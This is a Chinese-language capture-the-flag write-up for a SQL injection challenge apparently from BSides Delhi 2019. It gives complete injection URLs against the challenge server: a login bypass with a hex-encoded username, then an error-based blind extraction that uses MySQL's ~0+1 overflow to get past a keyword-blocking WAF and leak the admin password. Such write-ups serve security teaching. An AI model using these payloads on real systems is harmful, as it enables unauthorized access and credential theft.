# Seek You El

SQL Injection題

輸入的`pw`會直接拼在SQL Query上

`Query: select user from bsides where user='admin' and pw='{$_GET['_']}'`

然後背後有WAF，擋了不少東西，例如:`sleep`, `()`, `select`, ...

不過這題很坑的點是，他說`Login as admin to get the FLAG`

但可以輕鬆構造出: `http://35.232.184.83/?%5f='%20or%201=1%20and%20user=x'61646d696e'%23`

理論上就登入成功了

但啥鬼都沒噴出來，後來猜測可能還是要撈密碼

所以我後來就用 Error 去做 Boolean-based:

http://35.232.184.83/?%5f='or ~0%2b1%23 => error

http://35.232.184.83/?%5f='or ~0%2b0%23 => ok

(這是因為 MySQL 裡面，`~0+1`會噴錯)

後面就是用這種方式去暴力炸密碼了:

`http://35.232.184.83/?%5f='%20or%20user=x'61646d696e' and (~(ascii(mid(pw,1,1))>0)%2b1) %23`

`http://35.232.184.83/?%5f='%20or%20user=x'61646d696e' and (~(ascii(mid(pw,1,1))>100)%2b1) %23`

...

最後炸出來密碼是: `9f3b7c0e1a`

用這組密碼登入，就會噴flag了

![](https://github.com/w181496/CTF/blob/master/bsides_delphi_ctf_2019/SeekYouEl/seek.png)
